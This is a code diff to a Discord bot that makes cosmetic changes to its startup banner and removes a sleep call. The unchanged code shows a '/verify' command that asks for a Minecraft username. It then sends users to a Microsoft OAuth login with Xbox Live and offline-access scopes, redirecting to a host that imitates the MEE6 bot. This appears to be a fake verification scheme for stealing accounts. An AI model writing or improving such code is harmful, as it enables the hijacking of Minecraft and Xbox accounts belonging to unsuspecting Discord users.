@@ -18,18 +18,16 @@ redColor = 0xff0000
 
 @bing.event
 async def on_ready():
-  width = os.get_terminal_size().columns
-  print("██████╗ ██╗███╗   ██╗ ██████╗ ".center(width))
-  print("██╔══██╗██║████╗  ██║██╔════╝ ".center(width))
-  print("██████╔╝██║██╔██╗ ██║██║  ███╗".center(width))
-  print("██╔══██╗██║██║╚██╗██║██║   ██║".center(width))
-  print("██████╔╝██║██║ ╚████║╚██████╔╝".center(width))
-  print("╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ".center(width))
+  print("██████╗ ██╗███╗   ██╗ ██████╗ ")
+  print("██╔══██╗██║████╗  ██║██╔════╝ ")
+  print("██████╔╝██║██╔██╗ ██║██║  ███╗")
+  print("██╔══██╗██║██║╚██╗██║██║   ██║")
+  print("██████╔╝██║██║ ╚████║╚██████╔╝")
+  print("╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
   await bing.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="/verify | bing#0001"), status=discord.Status.dnd)
 
 @bing.slash_command(name="verify", description="Verify to access the server")
 async def verify(ctx, name:Option(str, "Minecraft IGN", required=True)):
-    time.sleep(2)
     button = Button(label="Verify", url="https://login.live.com/oauth20_authorize.srf?client_id=f8b8d615-4b98-464b-8be3-6e1ba57e6b83&response_type=code&redirect_uri=https://mee6-e58u.onrender.com&scope=XboxLive.signin+offline_access&state=OK")
     view = View()
     view.add_item(button)
